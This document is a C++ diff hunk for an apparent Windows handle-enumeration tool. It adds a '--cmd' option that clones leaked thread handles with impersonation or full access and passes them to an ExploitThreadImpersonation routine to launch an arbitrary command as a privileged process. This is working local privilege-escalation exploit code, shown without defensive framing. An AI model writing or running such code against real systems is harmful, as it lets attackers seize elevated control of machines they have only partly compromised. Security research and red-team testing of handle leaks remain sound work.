@@ -211,6 +211,28 @@ int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 						{
 							vSysHandle.push_back(handle);
 							printHandleInfo(handle, integrityLevel);
+							if (args.count(L"--cmd")) {
+								if (handle.GrantedAccess & THREAD_DIRECT_IMPERSONATION ||
+									handle.GrantedAccess == THREAD_ALL_ACCESS) {
+									HANDLE clHandle2;
+									if (!CloneHandle(handle.UniqueProcessId, (HANDLE)handle.HandleValue, &clHandle2)) {
+										std::cerr << "[-] CloneHandle failed\n";
+									}
+									else {
+										DWORD privPid = ExploitThreadImpersonation(
+											clHandle2,
+											(WCHAR*)args.find(L"--cmd")->second.c_str());
+										CloseHandle(clHandle2);
+										if (privPid == 0) {
+											std::cerr << "[-] ExploitThreadImpersonation failed\n";
+										}
+										else {
+											std::cerr << "[!] Privileged process launched with PID " << privPid << "\n";
+											return 0;
+										}
+									}
+								}
+							}
 						}
 						CloseHandle(clHandle);
 					}
